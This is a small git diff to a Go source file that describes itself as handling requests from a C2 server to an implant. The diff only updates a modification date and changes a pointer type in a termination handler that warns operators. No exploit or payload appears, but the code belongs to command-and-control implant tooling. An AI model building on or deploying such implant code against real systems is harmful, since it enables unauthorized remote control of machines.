@@ -5,7 +5,7 @@ package main
  * Requests from C2 to implant
  * By J. Stuart McMurray
  * Created 20220327
- * Last Modified 20220329
+ * Last Modified 20220510
  */
 
 import (
@@ -46,7 +46,7 @@ func handleFingerprintsRequest(req *ssh.Request) {
 /* handleDieRequest handles a request to terminate. */
 func handleDieRequest(req *ssh.Request) {
 	/* Warn all the operators. */
-	AllShells(func(tag string, s Shell) {
+	AllShells(func(tag string, s *Shell) {
 		s.Printf("Implant terminating.\n")
 	}, true)
 	/* Tell the server we got the message. */
